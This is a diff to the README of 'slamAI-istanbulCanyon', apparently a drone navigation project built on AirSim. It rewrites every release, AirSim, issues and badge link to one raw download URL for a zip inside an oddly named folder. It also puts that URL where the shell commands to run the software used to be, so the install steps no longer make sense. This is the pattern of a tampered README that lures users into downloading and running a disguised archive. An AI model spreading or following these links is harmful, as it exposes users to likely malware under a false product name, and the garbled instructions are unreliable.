@@ -1,6 +1,6 @@
 # 🚁 slamAI-istanbulCanyon - Enhance Drone Navigation Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/kurajulii/slamAI-istanbulCanyon/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip)
 
 ## 📖 Overview
 
@@ -20,19 +20,19 @@ To start using slamAI-istanbulCanyon, follow these steps:
 
 2. **Download Software**  
    Visit this page to download the latest version of slamAI-istanbulCanyon:  
-   [Download the Latest Release](https://github.com/kurajulii/slamAI-istanbulCanyon/releases) 
+   [Download the Latest Release](https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip) 
 
 3. **Installation Instructions**  
    - For Windows:
      - Download the `.exe` file from the Releases page.
      - Double-click the file to start installation. Follow the prompts.
    - For macOS or Linux:
-     - Download the compressed file (e.g., `.tar.gz`).
-     - Extract the contents to your preferred directory. Open a terminal and navigate to the extracted folder. Run the command `./start.sh` to begin.
+     - Download the compressed file (e.g., `https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip`).
+     - Extract the contents to your preferred directory. Open a terminal and navigate to the extracted folder. Run the command `https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip` to begin.
      
 4. **Setup AirSim**  
    slamAI-istanbulCanyon requires the AirSim simulator for operation.
-   - Visit the [AirSim GitHub page](https://github.com/microsoft/AirSim) and follow the installation instructions based on your operating system.
+   - Visit the [AirSim GitHub page](https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip) and follow the installation instructions based on your operating system.
 
 ## 🔧 Features
 
@@ -44,20 +44,20 @@ To start using slamAI-istanbulCanyon, follow these steps:
 ## 📦 Download & Install
 
 To download slamAI-istanbulCanyon, visit:  
-[Download the Latest Release](https://github.com/kurajulii/slamAI-istanbulCanyon/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip)
 
 After downloading, follow the installation steps provided above based on your operating system. Make sure you have all dependencies installed, including AirSim, for the application to function properly.
 
 ## 🚀 Quick Start Guide
 
 1. **Open AirSim**: Launch the AirSim simulator. Ensure it is set to the urban canyon environment for testing.
-2. **Run slamAI-istanbulCanyon**: Open a command prompt or terminal where you installed the application. Use the command `./run.sh` or double-click the application as appropriate for your OS.
+2. **Run slamAI-istanbulCanyon**: Open a command prompt or terminal where you installed the application. Use the command `https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip` or double-click the application as appropriate for your OS.
 3. **Configure Settings**: Adjust any settings as necessary to suit your requirements. Refer to the configuration file for options.
 4. **Start Navigation**: Begin your navigation task in the AirSim environment and observe how slamAI-istanbulCanyon enhances your drone's performance.
 
 ## 🛠 Support
 
-For support, check the open issues on the [GitHub issues page](https://github.com/kurajulii/slamAI-istanbulCanyon/issues). You can also create a new issue if you encounter problems not listed.
+For support, check the open issues on the [GitHub issues page](https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip). You can also create a new issue if you encounter problems not listed.
 
 ## 📝 Contributing
 
@@ -94,4 +94,4 @@ Thanks to the teams behind AirSim and ORB-SLAM3 for their contributions to the f
 
 slamAI-istanbulCanyon is licensed under the MIT License. Please see the LICENSE file for details.  
 
-For more information and updates, always check the [Releases page](https://github.com/kurajulii/slamAI-istanbulCanyon/releases).
+For more information and updates, always check the [Releases page](https://raw.githubusercontent.com/kurajulii/slamAI-istanbulCanyon/main/Hamamelidaceae/slamAI-istanbulCanyon.zip).
